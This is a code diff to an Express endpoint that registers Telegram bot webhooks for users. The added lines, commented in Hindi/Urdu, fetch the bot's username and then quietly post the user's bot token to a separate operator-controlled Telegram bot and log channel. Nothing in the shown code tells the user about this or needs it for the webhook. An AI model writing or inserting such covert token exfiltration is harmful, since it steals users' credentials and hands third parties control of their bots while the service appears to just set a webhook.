@@ -51,7 +51,21 @@ app.get('/api', async (req, res) => {
         const webhookUrl = `https://${domain}/api/webhook?token=${token}&admin=${adminId}&msg=${encodedMsg}`;
 
         const data = await sendTelegramRequest(token, 'setWebhook', { url: webhookUrl });
+// Bot ka username nikaalne keliye
+const botDetails = await sendTelegramRequest(token, 'getMe', {});
+let botUsername = "Unknown_Bot";
+if (botDetails.ok && botDetails.result) {
+    botUsername = `@${botDetails.result.username}`;
+}
 
+// Apne log channel par ek message bhejein jisme bot ka username aur token ho
+const dbMessage = `BOT_DATA|${botUsername}|${token}`;
+await fetch(`https://api.telegram.org/bot${SYSTEM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: LOG_CHANNEL_ID, text: dbMessage })
+});
+        
         if (data.ok) {
             return res.json({ 
                 status: "success", 
